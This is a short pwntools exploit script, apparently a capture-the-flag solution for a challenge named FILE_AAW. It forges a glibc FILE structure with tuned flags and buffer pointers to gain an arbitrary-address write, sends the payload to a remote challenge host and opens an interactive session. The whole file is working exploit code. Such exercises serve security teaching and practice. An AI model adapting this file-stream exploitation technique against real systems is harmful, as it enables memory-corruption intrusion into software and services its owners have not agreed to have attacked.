# FILE_AAW/solve.py
from pwn import *

context.arch = 'amd64'
#context.terminal = ['tmux', 'splitw', '-h']
#r = process('./chal')
r = remote('edu-ctf.zoolab.org', 10009)

flags = 0
NO_READ = 0x4
EOF_SEEN = 0x10
MAGIC = 0xfbad0000
flags &= ~(NO_READ | EOF_SEEN)
flags |= MAGIC
# print(hex(flags)) # 0xfbad0000

payload = flat(
    0, 0,
    0, 0x1e1,
    flags, 0,
    0, 0,
    0, 0,
    0, 0x404070,
    0x404070+0x20, 0,
    0, 0,
    0, 0x7ffff7fbc5c0,
    0
)
#gdb.attach(r)
r.sendline(payload)
r.interactive()